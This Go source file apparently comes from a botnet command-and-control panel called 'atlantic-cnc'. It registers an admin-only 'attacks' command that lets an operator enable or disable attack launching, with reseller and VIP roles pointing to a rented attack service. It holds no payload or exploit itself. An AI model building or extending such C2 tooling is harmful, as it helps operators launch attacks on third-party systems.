package util_Command

import (
	"atlantic-cnc/core/functions"
        "atlantic-cnc/core/sessions/sessions"
        "strings"
)

var status string

func init() {

	Register(&Command{
		Name: "attacks",

		Description: "set the attack mode",

		Admin: true,
		Reseller: false,
		Vip: false,

                Execute: func(Session *sessions.Session_Store, cmd []string) error {
                        if len(cmd) <= 1 {
				if functions.Status == "" || functions.Status == "enable" {
					Session.Channel.Write([]byte("Syntax invalid -> attacks [enable/disable]\r\nAttack status -> `enabled`\r\n"))
				} else if functions.Status == "disable" {
					Session.Channel.Write([]byte("Syntax invalid -> attacks [enable/disable]\r\nAttack status -> `disabled`"))
				}
                                return nil
                        }
                        status = strings.ReplaceAll(strings.Join(cmd, " "), cmd[0], "")
			if status == " enable" || status == " disable" {
				if status == " enable" {
		                        functions.Status = "enable"
        		                Session.Channel.Write([]byte("Attack status has been set to: `enable`.\r\n"))
				} else if status == " disable" {
		                        functions.Status = "disable"
        		                Session.Channel.Write([]byte("Attack status has been set to: `disable`.\r\n"))
				}
			} else if status != " enable" || status != " disable" {
				Session.Channel.Write([]byte("Syntax invalid -> attacks [enable/disable]\r\n"))
	                        return nil
			}
                        return nil
		},
	})
}
